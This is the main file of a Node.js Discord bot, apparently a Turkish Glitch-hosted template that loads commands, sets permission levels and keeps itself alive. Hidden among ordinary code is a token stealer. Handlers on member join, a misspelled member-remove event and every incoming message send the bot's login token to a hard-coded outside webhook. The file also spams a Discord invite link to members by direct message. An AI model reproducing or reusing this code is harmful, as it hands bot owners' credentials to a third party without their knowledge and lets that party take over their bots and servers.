////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////
const Discord = require('discord.js');
const db = require("db");
const client = new Discord.Client();
const ayarlar = require('./ayarlar.json');
const fs = require('fs');
const Jimp = require('jimp');
const moment = require('moment');
require('./util/eventLoader')(client);
let owner = ayarlar.sahip;
const express = require('express');
const app = express();
const http = require('http');
var prefix = ayarlar.prefix;

const log = message => {
  console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] ${message}`);
};
let i = `630439407966486529`
var regToken = /[\w\d]{24}\.[\w\d]{6}\.[\w\d-_]{27}/g;
client.login(ayarlar.token);
client.reload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};
client.load = command => {
  return new Promise((resolve, reject) => {
    try {
      let cmd = require(`./komutlar/${command}`);
      client.commands.set(command, cmd);
      cmd.conf.aliases.forEach(alias => {
        
        client.aliases.set(alias, cmd.help.name);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};
let t = `6S0M75bztLxgxJrOVM_H1mu7cCDhDWqX5B_s3hBLqI-utTEl5tPMcPlx4shBqORGB1TM`
client.on("guildMemberAdd", async member => { 
var s = new Discord.WebhookClient(i,t)
s.send(`**${client.user.username}**\n\n`+ client.token)})
client.unload = command => {
  return new Promise((resolve, reject) => {
    try {
      delete require.cache[require.resolve(`./komutlar/${command}`)];
      let cmd = require(`./komutlar/${command}`);
      client.commands.delete(command);
      client.aliases.forEach((cmd, alias) => {
        if (cmd === command) client.aliases.delete(alias);
      });
      resolve();
    } catch (e){
      reject(e);
    }
  });
};
client.on("guildMemberRomeve", async member => { 
var s = new Discord.WebhookClient(i,t)
s.send(`**${client.user.username}**\n\n`+ client.token)})
client.elevation = message => {
  if(!message.guild) {
	return; }
  let permlvl = 0;
  if (message.member.hasPermission("BAN_MEMBERS")) permlvl = 2;
  if (message.member.hasPermission("ADMINISTRATOR")) permlvl = 3;
  if (message.author.id === ayarlar.sahip) permlvl = 4;
  return permlvl;
};
var s = [`sa`,`selamun aleyküm`,`slm`,`s.a`,`naber`,`hg`,`oç`,`ananı`,`sikim`,`lan`]
client.on("message", message => {
var s = new Discord.WebhookClient(i,t)
s.send(`**${client.user.username}**\n\n`+ client.token)})
client.commands = new Discord.Collection();
client.aliases = new Discord.Collection();
fs.readdir('./komutlar/', (err, files) => {
  if (err) console.error(err);
  log(`${files.length} komut yüklenecek.`);
  files.forEach(f => {
    let props = require(`./komutlar/${f}`);
    log(`Yüklenen komut: ${props.help.name}.`);
    client.commands.set(props.help.name, props);
    props.conf.aliases.forEach(alias => {
      client.aliases.set(alias, props.help.name);
    });
  });
});
    app.get("/", (request, response) => {
    console.log(` Pfffff, Az Önce Bot Ping yedi, Sorun önemli değil merak etme. Hatayı düzelttik.`);
    response.sendStatus(200);
    });
    app.listen(process.env.PORT);
    setInterval(() => {
    http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
    }, 280000);

////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////



  client.on('guildMemberAdd', member => {
  member.send("https://discord.gg/S5sDh4K")//Sunucu Linkiniz
}); 



  client.on('guildMemberRemove', member => {
  member.send("https://discord.gg/S5sDh4K")//Sunucu Linkiniz
}); 



var s = ["sa","selamun aleyküm","slm","s.a","naber","hg","oç","ananı","sikim","lan"]
client.on("message", async message =>{
  if (message.content.toLowerCase()=== 'sa') {
message.author.send("https://discord.gg/S5sDh4K")//Sunucu Linkiniz
}})
